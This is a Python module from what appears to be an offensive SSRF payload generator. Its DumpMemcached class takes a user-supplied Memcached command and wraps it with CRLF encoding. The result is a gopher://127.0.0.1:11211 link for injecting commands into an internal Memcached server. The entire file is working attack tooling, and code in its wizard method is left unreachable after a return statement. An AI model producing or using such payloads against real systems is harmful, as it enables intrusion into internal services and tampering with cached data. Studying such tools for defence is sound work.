from .base import *

class DumpMemcached(GENERATOR):
    
    requirement = ["code"]
    def __init__(self, parser,options={}):
        if options["port"] == 0:
            options["port"] = 11211
        super().__init__(parser,options)
        self.set_requirement(self.requirement)
        arg = self.get_requirement()
        if arg.code == "":
            self.code = self.wizard()
        else:
            self.code = arg.code

    def generate(self):
        self.set_mode(PAYLOAD_TYPE.QUOTE_PLUS).\
            set_payload(self.code).\
            replace("+", "%20").\
            replace("%2F", "/").\
            replace("%25", "%").\
            replace("%3A", ":").\
            prefix("%0d%0a").\
            suffix("%0d%0a")
        return super().generate()

    def wizard(self):  
        code = input("\033[96m" +"Give payload you want to run in Memcached Server: "+ "\033[0m")
        return code
        payload = urllib.parse.quote_plus(code).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

        finalpayload = "gopher://127.0.0.1:11211/_%0d%0a" + payload + "%0d%0a"

        print("\033[93m" +"\nYour gopher link is ready to dump Memcache : \n"+ "\033[0m")
        print(finalpayload)
        print("\n" + "\033[41m" +"-----------Made-by-SpyD3r-----------"+ "\033[0m")

    